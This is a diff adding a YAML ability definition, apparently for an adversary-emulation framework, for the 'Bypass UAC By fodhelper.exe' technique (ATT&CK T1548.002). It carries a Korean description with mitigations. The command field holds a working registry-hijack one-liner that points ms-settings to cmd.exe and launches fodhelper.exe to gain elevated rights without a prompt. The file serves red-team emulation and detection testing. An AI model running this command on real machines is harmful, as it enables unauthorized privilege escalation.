@@ -1,0 +1,13 @@
+- id: uac_by_pass_by_fodhelper
+  description: Bypass UAC By fodhelper.exe 공격은 Windows에서 Fodhelper.exe 파일을 악용해 레지스트리 값을 조작, UAC를 우회하여 권한을 상승시키는 방법입니다. 이를 방지하려면 UAC 설정을 강화하고, 레지스트리 변경을 모니터링하며, 실행 파일을 화이트리스트로 제한해야 합니다.
+  name: Bypass UAC By fodhelper.exe
+  platforms:
+    windows:
+      psh:
+        command: |
+          reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f ; reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f ; fodhelper.exe
+
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: "Abuse Elevation Control Mechanism: Bypass User Access Control"
